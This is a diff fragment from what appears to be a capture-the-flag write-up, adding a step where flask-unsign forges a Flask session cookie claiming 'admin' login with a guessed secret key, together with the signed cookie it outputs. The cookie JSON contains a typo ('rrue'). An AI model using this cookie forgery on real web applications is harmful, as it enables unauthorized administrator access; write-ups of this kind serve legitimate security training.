@@ -817,6 +817,12 @@ secret_key_999999
 'secret_key_xxxxxx'
 ```
 
+
+```bash
+:~/Intranet# flask-unsign --sign --cookie '{"logged_in": rrue, "username": "admin"}' --secret 'secret_key'
+IntcImxvZ2dlZF9pblwiOiBycnVlLCBcInVzZXJuYW1lXCI6IFwiYWRtaW5cIn0i.aN02ZA.5zGKWNTWRjy-BYWYSwBDCkjTqVQ
+```
+
 <h2 align="center">JWT to enable admin´s session</h2>
 
 ```bash
